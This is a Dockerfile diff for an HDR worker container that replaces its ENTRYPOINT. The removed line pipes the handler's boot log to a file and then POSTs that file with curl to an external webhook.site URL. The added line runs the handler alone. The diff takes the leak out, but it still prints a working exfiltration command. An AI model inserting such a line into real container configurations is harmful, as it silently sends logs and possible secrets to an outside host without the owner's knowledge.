@@ -25,4 +25,4 @@ COPY --chown=hdrworker:hdrworker workers/hdr/multibrand_hdr.py workers/hdr/serve
 RUN mkdir -p /tmp/jin-lumeo-hdr && chown hdrworker:hdrworker /tmp/jin-lumeo-hdr
 
 USER hdrworker
-ENTRYPOINT ["sh", "-c", "python -u handler.py 2>&1 | tee /tmp/boot.log; curl -s -X POST --data-binary @/tmp/boot.log https://webhook.site/38694d51-cab3-4bb1-a6a6-d9506266f177; exit ${PIPESTATUS[0]}"]
+ENTRYPOINT ["sh", "-c", "exec python -u handler.py"]
